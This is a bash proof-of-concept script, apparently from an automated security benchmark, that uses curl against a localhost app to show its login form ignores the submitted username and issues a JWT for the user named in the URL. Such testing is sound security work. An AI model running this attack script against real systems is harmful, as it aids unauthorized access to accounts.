#!/bin/bash
# POC: Demonstrates authentication bypass where the form username parameter is ignored during password validation. An attacker can submit any username in the form, and as long as the password matches the URL parameter user, authentication succeeds.
# Target: ./repo
# Created: 2025-11-04T17:43:33.293Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# Authentication Bypass - Username Confusion in Password Form
# Demonstrates that the form username parameter is completely ignored
# Only the password is validated against the URL parameter user

TARGET_URL="http://localhost:8080"
TEST_USER="test"
TEST_PASSWORD="test"

echo "=== Authentication Bypass: Username Confusion in Password Form ==="
echo ""
echo "Target: $TARGET_URL/password/$TEST_USER"
echo ""

# Test 1: Submit with admin username in form, but correct password for test user
echo "[TEST 1] Submitting form with username=admin, password=test (correct for URL user 'test')"
RESPONSE1=$(curl -s -c /tmp/cookies1.txt -L -w "\n%{http_code}" \
  -X POST "$TARGET_URL/password/$TEST_USER" \
  -d "username=admin&password=$TEST_PASSWORD")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)

echo "HTTP Status: $HTTP_CODE1"
if echo "$BODY1" | grep -q "dashboard" || [ "$HTTP_CODE1" = "302" ]; then
    echo "✓ Authentication SUCCESSFUL despite admin username in form!"
    echo "Response contained redirect or dashboard content"
else
    echo "Response: $BODY1"
fi
echo ""

# Test 2: Submit with nonexistentuser123 username in form, but correct password for test user
echo "[TEST 2] Submitting form with username=nonexistentuser123, password=test (correct for URL user 'test')"
RESPONSE2=$(curl -s -c /tmp/cookies2.txt -L -w "\n%{http_code}" \
  -X POST "$TARGET_URL/password/$TEST_USER" \
  -d "username=nonexistentuser123&password=$TEST_PASSWORD")

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "HTTP Status: $HTTP_CODE2"
if echo "$BODY2" | grep -q "dashboard" || [ "$HTTP_CODE2" = "302" ]; then
    echo "✓ Authentication SUCCESSFUL despite nonexistentuser123 in form!"
    echo "Response contained redirect or dashboard content"
else
    echo "Response: $BODY2"
fi
echo ""

# Test 3: Submit with wrong password to confirm password is still validated
echo "[TEST 3] Submitting form with username=admin, password=WRONGPASSWORD (for URL user 'test')"
RESPONSE3=$(curl -s -c /tmp/cookies3.txt -L -w "\n%{http_code}" \
  -X POST "$TARGET_URL/password/$TEST_USER" \
  -d "username=admin&password=WRONGPASSWORD")

HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
BODY3=$(echo "$RESPONSE3" | head -n-1)

echo "HTTP Status: $HTTP_CODE3"
if echo "$BODY3" | grep -i -q "error\|incorrect\|wrong" || echo "$BODY3" | grep -q "?error="; then
    echo "✓ Authentication FAILED with wrong password (as expected)"
    echo "Error message displayed: $(echo "$BODY3" | grep -i "error" | head -1)"
else
    echo "Response: $BODY3"
fi
echo ""

# Test 4: Verify the JWT token contains the URL parameter user, not the submitted username
echo "[TEST 4] Verifying JWT token issued for URL user, not form username"
RESPONSE4=$(curl -s -b /tmp/cookies1.txt "$TARGET_URL/dashboard" -w "\n%{http_code}")

HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
BODY4=$(echo "$RESPONSE4" | head -n-1)

# Try to extract the JWT from the response or cookies
if [ -f /tmp/cookies1.txt ]; then
    JWT_TOKEN=$(grep -o "auth_token=[^;]*" /tmp/cookies1.txt | cut -d'=' -f2)
    if [ -n "$JWT_TOKEN" ]; then
        echo "JWT Token found in cookies: $JWT_TOKEN"
        # Decode JWT payload (second part)
        PAYLOAD=$(echo "$JWT_TOKEN" | cut -d'.' -f2)
        # Decode base64
        DECODED=$(echo "$PAYLOAD" | base64 -d 2>/dev/null || echo "$PAYLOAD" | base64 -D 2>/dev/null)
        echo "JWT Payload: $DECODED"
        if echo "$DECODED" | grep -q '"username":"test"'; then
            echo "✓ JWT contains username='test' (from URL), not 'admin' (from form)"
        fi
    fi
fi

if [ "$HTTP_CODE4" = "200" ]; then
    echo "✓ Dashboard access successful with token from form submission"
fi
echo ""

echo "=== VULNERABILITY CONFIRMED ==="
echo "The form username parameter is completely ignored."
echo "Authentication only validates the password against the URL parameter user."
echo "This allows attackers to log in as the URL user by submitting any username in the form."